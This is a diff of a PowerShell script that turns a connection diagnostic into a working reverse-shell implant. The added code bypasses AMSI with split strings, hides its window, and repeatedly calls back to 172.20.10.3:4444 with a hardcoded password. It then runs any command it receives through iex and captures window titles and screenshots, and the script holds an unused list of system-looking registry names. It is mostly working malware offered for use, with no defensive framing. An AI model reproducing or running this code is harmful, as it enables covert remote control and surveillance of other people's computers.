@@ -1,44 +1,86 @@
-# DIAGNOSTIC VERSION - Shows EXACT failure point
-$ip = '192.168.1.15'; $port = 4444
-Write-Host "[DIAG] Starting implant on $ip`:$port" -ForegroundColor Green
+$a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
+$a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
 
-try {
-    Write-Host "[DIAG] Creating TCP client..." -ForegroundColor Yellow
-    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-    Write-Host "[DIAG] TCP CONNECTED!" -ForegroundColor Green
-    
-    $stream = $client.GetStream()
-    $encoder = New-Object System.Text.UTF8Encoding
-    
-    Write-Host "[DIAG] Sending AUTH..." -ForegroundColor Yellow
-    $authBytes = $encoder.GetBytes("AUTH: ")
-    $stream.Write($authBytes, 0, $authBytes.Length)
-    $stream.Flush()
-    Write-Host "[DIAG] AUTH sent" -ForegroundColor Green
-    
-    Start-Sleep 2
-    Write-Host "[DIAG] Waiting for response..." -ForegroundColor Yellow
-    
-    $wait = 0
-    while (!$stream.DataAvailable -and $wait -lt 20) { 
-        Start-Sleep 500; $wait++
-        Write-Host "[DIAG] Wait $wait/20" -ForegroundColor Cyan
-    }
-    
-    if ($stream.DataAvailable) {
-        Write-Host "[DIAG] Data available!" -ForegroundColor Green
-        [byte[]]$buf = New-Object byte[] 512
-        $len = $stream.Read($buf, 0, 512)
-        $resp = $encoder.GetString($buf, 0, $len)
-        Write-Host "[DIAG] Server said: $resp" -ForegroundColor Magenta
-    } else {
-        Write-Host "[DIAG] NO RESPONSE FROM SERVER - CHECK LISTENER!" -ForegroundColor Red
-    }
-    
-} catch {
-    Write-Host "[DIAG] ERROR: $($_.Exception.Message)" -ForegroundColor Red
-} finally {
-    Write-Host "[DIAG] Diagnostic complete - check console above" -ForegroundColor White
+$api = Add-Type -Name Win32 -MemberDefinition @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
+'@ -PassThru
+$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+
+$ip = '172.20.10.3'
+$port = 4444
+$pass = "biskviti"
+$regNames = @("SysUpdate", "WinDiag")
+
+function Master-Kill {
+    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & exit`""
+    Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
+    exit
 }
 
-Read-Host "Press Enter to exit"
+while($true) {
+    try {
+        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $s = $c.GetStream()
+        $e = New-Object System.Text.UTF8Encoding
+        
+        $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
+        Start-Sleep -Milliseconds 500
+        
+        [byte[]]$authB = New-Object byte[] 64
+        $len = $s.Read($authB, 0, 64)
+        
+        if ($len -gt 0) {
+            $authResp = $e.GetString($authB, 0, $len).Trim()
+            if ($authResp -ne $pass) {
+                $s.Write(($e.GetBytes("AUTH FAIL`n")), 0, 10)
+                $c.Close(); continue
+            }
+        }
+
+        $s.Write(($e.GetBytes("AUTH OK`nPS " + $PWD + "> ")), 0, (20 + $PWD.Path.Length))
+
+        while($true) {
+            [byte[]]$b = New-Object byte[] 4096
+            $i = $s.Read($b, 0, $b.Length)
+            if ($i -le 0) { break }
+            
+            $in = $e.GetString($b, 0, $i).Trim()
+            $out = ""
+
+            if ($in -eq 'kill') { Master-Kill }
+            
+            elseif ($in -eq 'screen') {
+                $handle = $api::GetForegroundWindow()
+                $sb = New-Object System.Text.StringBuilder 256
+                $api::GetWindowText($handle, $sb, $sb.Capacity)
+                $out = "[WINDOW] " + $sb.ToString() + "`n"
+            }
+            
+            elseif ($in -eq 'screenshot') {
+                try {
+                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
+                    $g = [Drawing.Graphics]::FromImage($bmp)
+                    $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
+                    $ms = New-Object IO.MemoryStream
+                    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
+                    $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
+                    $g.Dispose(); $bmp.Dispose(); $ms.Close()
+                } catch { $out = "Screenshot failed`n" }
+            }
+            
+            else {
+                $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
+            }
+            
+            $prompt = "`nPS " + (Get-Location).Path + "> "
+            $resp = $e.GetBytes($out + $prompt)
+            $s.Write($resp, 0, $resp.Length)
+        }
+        $c.Close()
+    } 
+    catch { Start-Sleep 5 }
+}
